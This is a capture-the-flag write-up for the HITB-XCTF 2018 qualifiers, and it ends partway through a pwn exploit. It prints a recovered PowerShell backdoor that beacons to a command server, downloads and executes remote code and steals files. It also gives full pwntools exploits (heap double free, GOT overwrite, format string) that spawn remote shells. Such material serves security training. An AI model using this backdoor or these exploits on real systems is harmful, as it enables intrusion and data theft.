# HITB-XCTF GSEC CTF 2018 Quals

 - [HITB-XCTF GSEC CTF 2018 Quals](#hitb-xctf-gsec-ctf-2018-quals)
   - [rev](#rev)
     - [hacku (sces60107)](#hacku-sces60107)
     - [sdsun (sces60107 sasdf)](#sdsun-sces60107-sasdf)
     - [hex (sasdf)](#hex-sasdf)
       - [First try](#first-try)
       - [Second try](#second-try)
   - [misc](#misc)
     - [tpyx (sces60107)](#tpyx-sces60107)
     - [readfile (sces60107)](#readfile-sces60107)
     - [pix (sces60107)](#pix-sces60107)
   - [pwn](#pwn)
     - [once (kevin47)](#once-kevin47)
       - [Vulnerability](#vulnerability)
       - [Exploit](#exploit)
     - [gundam (kevin47)](#gundam-kevin47)
       - [Overview](#overview)
       - [Vulnerability](#vulnerability-1)
       - [Leak](#leak)
       - [Exploit](#exploit-1)
     - [d (kevin47)](#d-kevin47)
       - [Overview](#overview-1)
       - [Vulnerability](#vulnerability-2)
       - [Exploit](#exploit-2)
     - [babypwn (how2hack)](#babypwn-how2hack)
       - [Vulnerability](#vulnerability-3)
       - [Solution](#solution)
       - [Exploit](#exploit-3)
   - [web](#web)
     - [Upload (bookgin)](#upload-bookgin)
       - [Find the target](#find-the-target)
       - [Brute force the path and RCE](#brute-force-the-path-and-rce)
     - [Python's revenge (sasdf)](#pythons-revenge-sasdf)
       - [Payload](#payload)
     - [PHP lover (bookgin &amp; sces60107)](#php-lover-bookgin--sces60107)
       - [Possible SQL injection](#possible-sql-injection)
       - [Bypass WAFs](#bypass-wafs)
         - [Email format regex check](#email-format-regex-check)
         - [Hacker Filter](#hacker-filter)
       - [Get the flag](#get-the-flag)
     - [baby baby (bookgin)](#baby-baby-bookgin)
       - [Recon](#recon)
       - [RCE](#rce)
     - [baby nya (bookgin)](#baby-nya-bookgin)
       - [Exposed Jserv protocol](#exposed-jserv-protocol)
       - [Exploit the jolokia](#exploit-the-jolokia)
     - [baby fs (unsolved, written by bookgin, thanks to the organizer QQ group)](#baby-fs-unsolved-written-by-bookgin-thanks-to-the-organizer-qq-group)
     - [3pigs (unsolved, written by how2hack)](#3pigs-unsolved-written-by-how2hack)
       - [Hint](#hint)
       - [Web Challenge? WutFace](#web-challenge-wutface)
       - [First stage (Misc)](#first-stage-misc)
       - [Python Format String Vulnerability](#python-format-string-vulnerability)
       - [Second stage (Pwn)](#second-stage-pwn)
       - [Vulnerability](#vulnerability-4)
       - [Solution...?](#solution-1)
   - [crypto](#crypto)
     - [easy_block (sasdf)](#easy_block-sasdf)
       - [Vulnerability](#vulnerability-5)
       - [Construct payload](#construct-payload)
       - [Construct hash](#construct-hash)
     - [easy_pub (sasdf)](#easy_pub-sasdf)
     - [streamgamex (sasdf)](#streamgamex-sasdf)
     - [base (how2hack)](#base-how2hack)
   - [mobile](#mobile)
     - [kivy simple (sces60107)](#kivy-simple-sces60107)
     - [multicheck (sasdf)](#multicheck-sasdf)


## rev

### hacku (sces60107)

In this challenge give us two file. A pcap file and a chm file.

The chm file is useless. The pcap file has a large size, because it is downloading windows update file.

After some digging, I found the dns query is interesting. we can extract some base64 string. And I found a script after base64 decoding.
```ps1=
$GET_FILE = 'get-fle' 
$DOWN_EXEC = 'dow-exe'
$RUN_CMD = 'run-cmd'

$GET_REG = 'get-reg'
$GET_TASK = 'get-tak'
$GET_UPDATE = 'get-upd'
$GET_REP = 'get-rep'

$STATUS_INIT  = 0x0000
$STATUS_REGED = 0x8000
$STATUS_TASK  = $STATUS_REGED -bor 0x1
$STATUS_PADD  = $STATUS_REGED -bor 0x2


$url = 'http://192.168.99.234/cc/cc.php'
$status = $STATUS_INIT
$task = $null
$running = $True

$pubk = (1501,377753)

function get-Md5Hash($str)
{
	$md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
	$utf8 = new-object -TypeName System.Text.UTF8Encoding
	$hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($str)))
	return $hash -replace '-'
}

function get-ComputeName
{
	try
	{
		return (Get-WmiObject Win32_ComputerSystem).Name;
	} catch 
	{
		return "ErrComputeName";
	}
}

function get-clientID
{
	try
	{
		$did = (wmic diskdrive get SerialNumber)
		$cid = get-Md5Hash $did
		return $cid
	}
	catch
	{
		$CompName = get-ComputeName
		return get-Md5Hash $CompName
	}
}
function Reg-Info
{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_REG
	return @{c = $c ; x = $clientID ;e = $time ; i = 0} |  ConvertTo-Json
}
function get-Task
{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_TASK
	return @{c = $c ; x = $clientID ;e = $time  ; i = 0} |  ConvertTo-Json
}
function EttRRRRRRhd ( $tid , $taskinfo )
{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_REP
	return @{c = $c ; x = $clientID ;e = $taskinfo; i = $tid} |  ConvertTo-Json
}

function check_VM()
{
	$p = @("win32_remote","win64_remote64","ollydbg","ProcessHacker","tcpview","autoruns","autorunsc","filemon","procmon","regmon","procexp","idaq","idaq64","ImmunityDebugger","Wireshark","dumpcap","HookExplorer","ImportREC","PETools","LordPE","dumpcap","SysInspector","proc_analyzer","sysAnalyzer","sniff_hit","windbg","joeboxcontrol","joeboxserver")
	for ($i=0; $i -lt $p.length; $i++) {
		if(ps -name $p[$i] -ErrorAction SilentlyContinue){
			shutdown /s /f /t 0
			exit
		}
	}
}

function YTRKLJHBKJHJHGV($msg)
{
	while($True)
	{
		try
		{
			$content = $msg
			$webRq = [System.Net.WebRequest]::Create($url)
			$webRq.proxy = [Net.WebRequest]::GetSystemWebProxy()
			$webRq.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
			
            
            #
            
            $content = YNHGFOI8YIUGH $content
            
            
            #
            $content = OPKE3989hYYY $pubk $content
            #
            
            #
            $content = YNHGFOI8YIUGH $content
            
			$enc = [System.Text.Encoding]::UTF8.GetBytes($content)
            
            #

			$webRq.Method = 'POST'
			$webRq.ContentLength = $enc.length
			
			
			if ($enc.length -gt 0)
			{
				$req_stream = $webRq.GetRequestStream()
				$req_stream.Write($enc , 0 , $enc.length)
				
			}
			
			[System.Net.WebResponse] $rep = $webRq.GetResponse()
			if ($rep -ne $null)
			{
				$data = $rep.GetResponseStream()
				[System.IO.StreamReader] $res_d = New-Object System.IO.StreamReader $data
				[String] $result = $res_d.ReadToEnd()
 			}
		}
		catch
		{
			$result = 'err'
            #
		}
		
		if ($result -eq 'err')
		{
			
		}
		else
		{
            
			return $result
		}
	}
}

function POIUIGKJNBYFF($msg)
{

    $msg = OKMNHGGGGSSAAA $pubk $msg
	$msg = ConvertFrom-Json -InputObject $msg
	return $msg.r,$msg.e
}

function YNHGFOI8YIUGH( $str )
{
	return [Convert]::ToBase64String( [System.Text.Encoding]::Utf8.GetBytes($str))
}

function VCDHJIIDDSQQQ( $b64 )
{
	return [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($b64))
}

function POPOUIUJKKKI($file)
{
	return YNHGFOI8YIUGH (Get-Content $file)
}

function MJOOLLFGFASA($name)
{
	$filelist = @()
	$result = @{}
	
	for ($i = 0x43 ; $i -lt 0x5b; ++ $i)
	{
		try
		{   $dc = '{0}:/' -f ([char]$i)
			$file = Get-ChildItem "$dc" -recurse $name | %{$_.FullName}
			if ($file.length -gt 0)
			{
				$filelist += $file
			}
		}
		catch
		{
			continue
		}
	}
	
	$result.ct = $filelist.length
	$result.dt = @()
	foreach( $f in $filelist)
	{
		$fd = POPOUIUJKKKI $f
		$result.dt += @{path=(YNHGFOI8YIUGH $f ); txt=$fd}
	}
	return ConvertTo-Json -InputObject $result 
}


function DXCFGIOUUGKJB764($x, $h, $n)
{
   $y = 1
   while( $h -gt 0 )
   {
        if ( ( $h % 2 ) -eq 0)
        {
            $x = ($x * $x) % $n
            $h = $h / 2
        }else
        {
            $y = ($x * $y) % $n
            $h = $h - 1
        }
   }
   return $y
}

function OPKE3989hYYY($pk , $plaintext)
{
    $key , $n = $pk
    $arr = @()
    for ($i = 0 ; $i -lt $plaintext.length ; $i++)
    {
     $x = DXCFGIOUUGKJB764 ([int] $plaintext[$i]) $key $n
     $arr += $x
    }
    return $arr
}
function OKMNHGGGGSSAAA($pk,$enctext)
{
    $key , $n = $pk
    $txt = ""

    $enctext = VCDHJIIDDSQQQ $enctext
    [int[]]$enctab =  $enctext -split ' '
    foreach ($x in $enctab)
    {
        if ($x -eq 0)
        {
            continue
        }
        $x = DXCFGIOUUGKJB764 $x $key $n
        $txt += [char][int]$x
    }
    $txt = VCDHJIIDDSQQQ($txt)
    return $txt
}

function UIHIUHGUYGOIJOIHGIHGIH($cmd)
{
	$cmd = ConvertFrom-Json -InputObject $cmd
	$c = $cmd.c
	$i = $cmd.i
	$e = $cmd.e
	$x = $cmd.x 
	
	#
	#
	
	if ($c -eq $GET_FILE)
	{
		
		$d = MJOOLLFGFASA $e
	}
	elseif ($c -eq $RUN_CMD)
	{
		
		$d = Invoke-Expression $e -ErrorAction SilentlyContinue
	}
	elseif ($c -eq $DOWN_EXEC)
	{
		
		$d = Invoke-Expression ((New-Object Net.WebClient).DownloadString("$e")) -ErrorAction SilentlyContinue
	}
return @($i , $d)
}


$MuName = 'Global\_94_HACK_U_HAHAHAHAHA'
$retFlag = $flase
$Result = $True 
$MyMutexObj = New-Object System.Threading.Mutex ($true,$MuName,[ref]$retFlag)
if ($retFlag)
{
	$Result = $True
}
else
{
	$Result = $False
}

if ($Result)
{
	while($True -and $running)
	{
		
		if($status -eq $STATUS_INIT)
		{
			
			$OO0O0O0O00 = Reg-Info
			
			
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
            
			$r,$e = POIUIGKJNBYFF($ret)
            
            
			if ($r -eq 'yes' -and $e -eq 'ok_then_u_go')
			{
				$status = $STATUS_PADD
				
				
			}
		}
		if ($status -eq $STATUS_PADD)
		{
			
			
			$OO0O0O0O00 = get-Task
			
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
			$r,$e = POIUIGKJNBYFF($ret)
			if ($r -eq 'yes')
			{
				
				$task = $e
				$status = $STATUS_TASK
			}
			
		}
		if ($status -eq $STATUS_TASK)
		{
			
			
			#
			$ret = UIHIUHGUYGOIJOIHGIHGIH($task)
			$OO0O0O0O00 = EttRRRRRRhd $ret[0] $ret[1]
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
			
			$r,$e = POIUIGKJNBYFF($ret)
			if ($r -eq 'yes')
			{
				$status = $STATUS_PADD
				$task = $null
			}
		}
		
		sleep 3
	}
	$MyMutexObj.ReleaseMutex() | Out-Null
	$MyMutexObj.Dispose() | Out-Null
}
else
{

}
```

They use `rsa` to encrypt message. the n is easy to factor.

Still, we can find out the encrypted message from pcap file.

We also extract two things from those message. The first one is a rar file, the second is a ps1 script.

We cannot open the rar file. After a few hour, the host change the challenge. Now we have flag part1 instead of rar file. The flag part1 is `HITBXCTF{W0rk_1n_th3_dark_`

Let's see the ps1 script. It actually generate a exe file at the temp directory.

Then, we can reverse that exe file.

I found out that it's trying to write something on MBR. 

The final step is reversing what it write on MBR. It's 80286 architecture.

Now we just need decode the encryted flag part2.
```python=
ciphertext='%\xa19\x89\xa6\x9d\xd5\xa5u\x8dJ\x92\xf1Y^\x91'
def ror(a,b):
  return (a>>b)|(a<<(8-b))
def rol(a,b):
  return (a<<b)|(a>>(8-b))
flag=""
table=[]
#maintain a table
for j in range(256):
  x=j
  x=ror(x,3)%256
  x^=0x74
  x=rol(x,5)%256
  x+=0x47
  x%=256
  if(x%2==0):
    teble.append(x-1)
  else:
    table.append(x+1)
for i in ciphertext:
  flag+=chr(table.index(ord(i)))
print flag
```

### sdsun (sces60107 sasdf)

The first thing you will notice is that the binary is packed by upx.

The way I unpack the binary is using gdb. I let the binary exectue for a while. It will be unpacked in the memory. So I can dump the whole memory in gdb.

Now I have the unpacked binary. but it is hard to understand it.

I found some feature indicating that this binary is written in Go language.

Then I use this [script](https://gitlab.com/zaytsevgu/goutils/blob/master/go_renamer.py) to recover the symbol. It will be much easier to understand this binary.
![](https://i.imgur.com/ysBuyUy.png)

It seems like there is a backdoor. This binary will listen to a random port. And it will output the port number.

The communication with the backdoor is compressed. and it use zlib. Also, the communication format is json.

The backdoor will give you flag if your command is `{"action":"GetFlag"}`. We found this rule in `main.Process`
![](https://i.imgur.com/w487Voi.png)

Now we have the flag `HITB{4e773ff1406800017933c9a1c9f14f35}`





### hex (sasdf)
A arduino challenge, data is in intelhex format. I use helper script `hex2bin.py` from intexHex python library to generate binary.

#### First try
Loaded in disassembler with MCU as AVR, you can easily find pattern below keep repeating started from 0x987 (in IDA, or 0x130e in radare2)
```asm
ldi r22, 0xXX
ldi r24, 0x77
ldi r25, 0x01
call 0xffa
ldi r22, 0xf4
ldi r23, 0x01
ldi r24, 0x00
ldi r25, 0x00
call 0xbda
ldi r22, 0xXX
ldi r24, 0x77
ldi r25, 0x01
call 0xf62
ldi r22, 0x88
ldi r23, 0x13
ldi r24, 0x00
ldi r25, 0x00
call 0xbda
```
I dumped all `XX` bytes in previous pattern but didn't figure out how to decode it. So I decided to dig into these functions. It tooks me about half hour to manually decompile `fcn.ffa` to following (wrong) psuedo code:
```python
r26 = 0x77
if r22 >= 136:
    r31 = 0
    r30 = r22 & 0x7f
    mem[0x77+4] |= (1 << r30)
    r22 = 0
else:
    r22 + 0x78

if r22 not in mem[0x77+6:0x77+0xc]: # six slots
    try:
        slot = mem[0x77+6:0x77+0xc].index(0)
    except:
        mem[0x77+3] = 0
        mem[0x77+2] = 1
        return
    mem[0x77+6+slot] = r22

fcn_e7e()
```
I gave up.

#### Second try
After the third hint `Keyboard` is out, I suddenly realized that MCU of Arduino Micro is ATmega32u4, a USB enabled device, rather than common arduino MCU ATmega328p. Everything makes sense now. The structure in 0x77 must be USB keyboard report which has 6 slot (a obvious sign if you are familar with NKRO or know the difference between PS2 and USB keyboard). Here's source code from Arduino's Keyboard library:
```C++
size_t Keyboard_::press(uint8_t k) 
{
	uint8_t i;
	if (k >= 136) {			// it's a non-printing key (not a modifier)
		k = k - 136;
	} else if (k >= 128) {	// it's a modifier key
		_keyReport.modifiers |= (1<<(k-128));
		k = 0;
	} else {				// it's a printing key
		k = pgm_read_byte(_asciimap + k);
		if (!k) {
			setWriteError();
			return 0;
		}
		if (k & 0x80) {						// it's a capital letter or other character reached with shift
			_keyReport.modifiers |= 0x02;	// the left shift modifier
			k &= 0x7F;
		}
	}
	
	// Add k to the key report only if it's not already present
	// and if there is an empty slot.
	if (_keyReport.keys[0] != k && _keyReport.keys[1] != k && 
		_keyReport.keys[2] != k && _keyReport.keys[3] != k &&
		_keyReport.keys[4] != k && _keyReport.keys[5] != k) {
		
		for (i=0; i<6; i++) {
			if (_keyReport.keys[i] == 0x00) {
				_keyReport.keys[i] = k;
				break;
			}
		}
		if (i == 6) {
			setWriteError();
			return 0;
		}	
	}
	sendReport(&_keyReport);
	return 1;
}
```
Ahh, `fcn.ffa` is `Keyboard::_press`!! It turns out that `fcn.f62` is `Keyboard::_release` and `fcn.bda`, which use timer register `TCNT0`, is `delay`.

Take our previous dump of parameters, convert it to keystroke, and the flag shows up.
```
      $##&:|#|                          !##| ;&&&&&&$#   #$##@|.    `%##@;  :@#$`
     |#|   |#|                         ;#%.  !#!       .%#|  #&#!  |#|  #&@:  :#%.
   ;#####|.|#|  .|####$`   #&###|!@%.  ;#|   |#;              |#! :@$`   ;#%.`:@%.
     |#!   |#|   `.  :@$` ;#&#  .%#%.  !#|  .%##@&##@#      :&#!  ;#%.   :@$`  #&$`
     |#!   |#|  `%#####&#.%#!#####;#%`!#@;          ;#$`   ;##!    ;#$`   ;#%.` $#$`
     |#!   |#| .%#@%&@#&#  |####&&#%.  ;#|   !##@@##%` :@#######$. `$##@##!   @%.
```

P.S. I think if you find an Arduino Micro, burn the firmware, plug into PC, then you will get the flag in one hour. No reverse needed.

## misc

### tpyx (sces60107)

The png file is broken. It seems like We need to fix it first.
`pngcheck` tell us that it has crc checksum error
```shell
$ pngcheck -v e47c7307-b54c-4316-9894-5a8daec738b4.png 
File: e47c7307-b54c-4316-9894-5a8daec738b4.png (1164528 bytes)
  chunk IHDR at offset 0x0000c, length 13
    1024 x 653 image, 32-bit RGB+alpha, non-interlaced
  chunk IDAT at offset 0x00025, length 1162839
    zlib: deflated, 32K window, default compression
  CRC error in chunk IDAT (computed ecfb2a19, expected ba3de214)
ERRORS DETECTED in e47c7307-b54c-4316-9894-5a8daec738b4.png
```

When you try to fix the crc checksum, you will notice that  the size of IDAT chunk is also wrong. The true size is 1164470 not 1162839

After corrected all faults, just use `zsteg` to detect any interesting things and also extract them.
```shell
$ zsteg e47c7307-b54c-4316-9894-5a8daec738b4_fixed.png
[?] 1 bytes of extra data after image end (IEND), offset = 0x11c4ef
extradata:imagedata .. file: zlib compressed data
...
...
$ zsteg e47c7307-b54c-4316-9894-5a8daec738b4_fixed.png -e extradata:imagedata > zlibdata
$ python -c "import zlib; print zlib.decompress(open('zlibdata').read())" > data
$ cat data
377abcaf271c000382f96c91300000000000000073000000000000003c0e24409c429fdb08f31ebc2361b3016f04a79a070830334c68dd47db383e4b7246acad87460cd00ba62cfae68508182a69527a0104060001093000070b0100022406f107010a5307cb7afbfaec5aa07623030101055d0000010001000c2c2700080a01c35b933000000501110b0066006c00610067000000120a010000844bf3571cd101130a010000e669e866d1d301140a010080ffcdd963d1d301150601008000000000001800345172634f556d365761752b5675425838672b4950673d3d
$ cat data | xxd -r -p > data
$ file data
data.7z: 7-zip archive data, version 0.3

```
Now we have a 7z file, but we need password.
The 7z file is actually appended with the password.
```shell
$ xxd data
00000000: 377a bcaf 271c 0003 82f9 6c91 3000 0000  7z..'.....l.0...
00000010: 0000 0000 7300 0000 0000 0000 3c0e 2440  ....s.......<.$@
00000020: 9c42 9fdb 08f3 1ebc 2361 b301 6f04 a79a  .B......#a..o...
00000030: 0708 3033 4c68 dd47 db38 3e4b 7246 acad  ..03Lh.G.8>KrF..
00000040: 8746 0cd0 0ba6 2cfa e685 0818 2a69 527a  .F....,.....*iRz
00000050: 0104 0600 0109 3000 070b 0100 0224 06f1  ......0......$..
00000060: 0701 0a53 07cb 7afb faec 5aa0 7623 0301  ...S..z...Z.v#..
00000070: 0105 5d00 0001 0001 000c 2c27 0008 0a01  ..].......,'....
00000080: c35b 9330 0000 0501 110b 0066 006c 0061  .[.0.......f.l.a
00000090: 0067 0000 0012 0a01 0000 844b f357 1cd1  .g.........K.W..
000000a0: 0113 0a01 0000 e669 e866 d1d3 0114 0a01  .......i.f......
000000b0: 0080 ffcd d963 d1d3 0115 0601 0080 0000  .....c..........
000000c0: 0000 0018 0034 5172 634f 556d 3657 6175  .....4QrcOUm6Wau
000000d0: 2b56 7542 5838 672b 4950 673d 3d         +VuBX8g+IPg==
$ 7z x data -p4QrcOUm6Wau+VuBX8g+IPg==
..
Extracting  flag
..
$ cat flag
HITB{0c88d56694c2fb3bcc416e122c1072eb}
```

### readfile (sces60107)

It seems like the non-punctuation letter will be filtered.

So I try to readfile with `Arithmetic expansion`

The payload is `$(</????/????_??_????/*)`

Then we can read the flag `HITB{d7dc2f3c59291946abc768d74367ec31}`

### pix (sces60107)

Use `zsteg` to extract a keepassX database file

```shell
$ zsteg aee487a2-49cd-4f1f-ada6-b2d398342d99.SteinsGate
imagedata           .. text: " !#865   "
b1,r,msb,xy         .. text: "y5b@2~2t"
b1,rgb,lsb,xy       .. file: Keepass password database 2.x KDBX
b2,r,msb,xy         .. text: "\rP`I$X7D"
b2,bgr,lsb,xy       .. text: "b;d'8H~M"
b4,g,msb,xy         .. text: ";pTr73& dvG:"
$ zsteg aee487a2-49cd-4f1f-ada6-b2d398342d99.SteinsGate -e b1,rgb,lsb,xy > keedatabase.kbdx
```

Now we have to launch a dictionary attack against this database. then I found [this](https://www.rubydevices.com.au/blog/how-to-hack-keepass)

Finally, I found the password and also found the flag found the flag from the database.

The flag is `HITB{p1x_aNd_k33pass}`






## pwn

### once (kevin47)

#### Vulnerability
* Fd and bk of the link list can be overwritten

#### Exploit
```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('47.75.189.102', 9999)
lib = ELF('./libc-2.23.so')

# leak
r.sendline('0')
r.recvuntil('choice\n')
x = r.recvuntil('>', drop=True)
libc = int(x, 16) - 0x6f690
lib.address = libc
print hex(libc)

# stage 1
# overwrite bk
r.sendline('2')
ubin = libc + 0x3c4b70-8+0x10+8
r.send(flat(0xdeadbeef, 0x101, 0xdeadbeef, ubin))
r.sendlineafter('>', '1')
# unlink
r.sendlineafter('>', '3')   # ubin -> bss

# stage 2
#r.sendline('4')
r.sendlineafter('>', '4')
# alloc on bss
r.sendlineafter('>', '1')
r.sendlineafter('size:', str(0x100-8))
# write bss
stdout, stdin = libc+0x3c5620, libc+0x3c48e0
binsh = libc+1625367
payload = [
    0, lib.symbols['__free_hook'],     # link list bk to overwrite free hook
    stdout, 0,
    stdin, 0,
    0, binsh,     # ptr containing "/bin/sh"
    [0]*10,     # flags = 0
]
r.sendlineafter('>', '2')
r.send(flat(payload))
# we can edit1 again :), plus bk is on free hook
# back to stage 1
r.sendlineafter('>', '4')

# ovewrite free_hook
r.sendlineafter('>', '2')
r.send(flat(lib.symbols['system']))

# stage 2
r.sendlineafter('>', '4')
# free(ptr) == system("/bin/sh")
r.sendlineafter('>', '3')


r.interactive()

# HITB{this_is_the_xxxxxxx_flag}
```

### gundam (kevin47)

#### Overview
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```
There are 4 operations:
1. Build a gundam
2. Visit gundams
3. Destroy a gundam
4. Blow up the factory

The structure of a gundam is:
```
     +---------+
     |flag     |              0x100
     +---------+     +--------------------+
     |name_ptr |---->|        name        |   
0x28 +---------+     +--------------------+
     |type(str)|
     |         |
     |         |
     +---------|
```
* An array of pointer to the gundam structure is on bss.
* When a gundam is builded, the program malloc chunks of size 0x28 and 0x100 as shown above, set them properly, and store into the array of pointer on bss.
* Visit gundams prints gundams' index, name and type that are not destroyed.
* Destroy a gundam sets the flag to 0 and frees the name
* Blow up the factory frees the gundam structures that flag are 0.

#### Vulnerability
* Read name without ending null byte, which can be used to leak.
* Destroy a gundam does not clear the name_ptr, which leads to use after free (double free).
* The program is running with libc-2.26, which implemented a new feature called tcache to improve performance. However, it does not perform any sanity check for performance's sake. That is, fastbin dup attack  can be done anywhere any size without satisfying the size's contraint.

#### Leak
* Leaking libc addres will be a little bit more complicated than older versions of libc, since tache acts like fastbins and only have heap address on it.
* However, tcache has a maximun of 7 chunks. By freeing more than 7 chunks, the remaining chunks will be treated as usual. That is, the chunks of size 0x100 will be at unsorted bins and small bins rather than tache, which contains libc address.

#### Exploit
* Leak libc and heap addresses.
* Use fastbin dup attack to malloc a chunk on **&__free_hook**. Note that in older version of libc we have to `free(a); free(b); free(a);` to bypass double free check. But tache doesn't check, so it can be done simply by `free(a); free(a);`
* Overwrite **__free_hook** to **system**. After that, Destroying a gundam with the name `/bin/sh`, which calls `free(name)` will be converted to `system("/bin/sh")`


``` python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('47.75.37.114', 9999)
lib = ELF('./libc.so.6')

def build(name, typee):
    r.sendlineafter('choice : ', '1')
    r.sendafter('gundam :', name)
    r.sendlineafter('gundam :', str(typee))

def visit():
    r.sendlineafter('choice : ', '2')
    return r.recvuntil('1 . Build', drop=True)

# double free
def destroy(idx):
    r.sendlineafter('choice : ', '3')
    r.sendlineafter('Destory:', str(idx))

def blow_up():
    r.sendlineafter('choice : ', '4')


# leak
for i in range(9):
    build(chr(0x11*(i+1))*16, 0)
for i in range(8):
    destroy(i)
blow_up()
for i in range(7):
    build(chr(0x11*(i+1)), 0)
build('a'*8, 0)
x = visit()
xx = re.findall('0\] :(.*)Type\[0', x, re.DOTALL)[0]
heap = u64(xx.ljust(8, '\x00')) - 0x811
xx = re.findall('aaaaaaaa(.*)Type\[7', x, re.DOTALL)[0]
libc = u64(xx.ljust(8, '\x00')) - 0x3dac78
lib.address = libc
print hex(heap)
print hex(libc)

# exploit
# trigger double free libc 2.26 doesn't do any sanity check on tcache
# libc 2.26 is awesome!!
destroy(2)
destroy(1)
destroy(0)
destroy(0)
blow_up()
build(flat(lib.symbols['__free_hook']), 0)
build('/bin/sh\x00', 0)
build(flat(lib.symbols['system']), 0)
destroy(1)

#embed()
r.interactive()

# HITB{now_you_know_about_tcache}
```

### d (kevin47)

#### Overview
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
There are 3 operations:
1. Read message
2. Edit message
3. Wipe message

* On read message, we enter a base64 encoded string, the program decodes it and stores in the heap, with ending null byte
* Edit message read `strlen(message)` bytes to the message.
* Wipe message frees the message and clears the pointer

#### Vulnerability
* Base64 decode does not check the length properly. If we send `'YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ'` which is `base64encode('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')` without the ending `'=='`, the decoder miscalculates the length of the string, which leads to no ending null byte. Edit message then could be used to overwrite next chunk's size.

#### Exploit
* Use poinson null byte to create overlapped chunks.
* Use fastbin dup attack to malloc a chunk on bss, where the pointers are.
* We can overwrite the pointers, which leads into arbitrary memory write.
* Change free@got to puts@plt, this enable us to leak libc address.
* Change atoi@got to system. After this, when reading choice we can enter `/bin/sh`, which calls `atoi(buf)` that is `system('/bin/sh')` now.
```python 
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('47.75.154.113', 9999)

def new_msg(idx, content):
    r.sendlineafter('Which? :', '1')
    r.sendlineafter('Which? :', str(idx))
    r.sendlineafter('msg:', content)

def edit_msg(idx, content, pwn=0):
    r.sendlineafter('Which? :', '2')
    r.sendlineafter('Which? :', str(idx))
    if pwn:
        r.sendafter('msg:', content)
    else:
        r.sendlineafter('msg:', content)

def del_msg(idx):
    r.sendlineafter('Which? :', '3')
    r.sendlineafter('Which? :', str(idx))

def b64e(c):
    return c.encode('base64').replace('\n', '')

def exp_new_msg(idx, content):
    b64 = b64e(content)
    if b64[-2] == '=':
        new_msg(idx, b64[:-2])
    elif b64[-1] == '=':
        new_msg(idx, b64[:-1])
    else:
        new_msg(idx, b64)

# 40 & 41 are the magic numbers :)
exp_new_msg(0, 'a'*40)
new_msg(1, b64e('a'*0x203))
new_msg(2, b64e('a'*0x100))
edit_msg(1, flat(
    [0xdeadbeef]*28,
    0xf0, 0x20,
    0, 0,
    [0xaabbccdd]*30,
    0x200, 0x120,
))

# overflow 1's size (unsorted bin)
del_msg(1)
edit_msg(0, 'a'*40)

new_msg(3, b64e('b'*0x100))
new_msg(4, b64e('c'*0x60))
del_msg(3)
del_msg(2)
# for fastbin attack
del_msg(4)

# overlapped chunks, overwrite fastbin->fd
new_msg(5, b64e('d'*0x200))
fast_bin_addr = 0x60216d
edit_msg(5, flat(
    [0]*32,
    0, 0x71,
    fast_bin_addr,
))

new_msg(6, b64e('a'*0x60))
# on bss
new_msg(60, b64e('A'*0x60))
free_got = 0x602018
strlen_got = 0x602028
atoi_got = 0x602068
puts_plt = 0x400770
alarm_plt = 0x4007b0
edit_msg(60, 'BBB'+flat(free_got, atoi_got, atoi_got, strlen_got))

# free -> puts
edit_msg(0, flat(puts_plt))
# free(1) == puts(atoi_got)
del_msg(1)
x = r.recvuntil('1. read')
xx = x[8:14].ljust(8, '\x00')
libc = u64(xx)-0x36e80
system = libc + 0x45390
print 'libc:', hex(libc)

# strlen -> alarm to bypass read_n len restriction
edit_msg(3, flat(alarm_plt))
# atoi -> system
edit_msg(2, flat(system)[:-1])
r.sendline('/bin/sh')

r.interactive()

# HITB{b4se364_1s_th3_b3st_3nc0d1ng!}
```

### babypwn (how2hack)

#### Vulnerability
A challenge with format string vulnerability without given binary.

#### Solution
My first intuition is to find the `.got.plt` section and overwrite something into `system`. As the binary has no PIE enabled (can find out by leaking some address out and you will notice there are a lot of address start with `0x40XXXX` or `0x60XXXX`), we can guess the `.got.plt` section is around `0x601000`.

```
0x601000 0x202020600e20
0x601008 0x7fb6b4617168
0x601010 0x7fb6b4407870
0x601018 0x7fb6b409c6b0
0x601020 0x102020202020 # ????
0x601028 0x7fb6b4094d80
0x601030 0x7fb6b4123d60
```
I was unable to leak `0x601020` for some reason.
I try to leak the called functions as well.
```
0x4003c5 gets    ?@
0x4003ca stdin    ?@
0x4003d0 printf    ?@
0x4003d7 stdout    ?@
0x4003de stderr    ?@
0x4003e5 usleep    ?@
0x4003ea setbuf    ?@
0x4003f1 __libc_start_main    ?@
```
Then I have to leak the libc version, but I am too lazy to do it so I try to find my local libc and check for the offset.
```
gets: 0x6ed80    (0x601028)
printf: 0x55800  (0x601020)?
usleep: 0xfdd60  (0x601030)
```
Now I understand why `0x601020` was unable to leak because of the null byte of its offset. I confirmed this by checking `0x601021` and I got this:
```
0x601021 0x7f3e9ac0d8 (end with '8', so the offset should be '800')
```
Finally, overwrite `printf` to `system` then we get the shell.

#### Exploit
```python
#!/usr/bin/env python

from pwn import *

host = '47.75.182.113'
port = 9999

r = remote(host, port)

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = '%' + str(result) + 'c'
    elif prev == word:
        result = 0
    else:
        result = 256 - prev + word
        fmtstr = '%' + str(result) + 'c'
    fmtstr += '%' + str(index) + '$hhn'
    return fmtstr

sleep(5)

system_off = 0x45390
printf_plt = 0x601020
gets_plt = 0x601028
gets_off = 0x6ed80

payload = '%7$s    ' + p64(gets_plt)
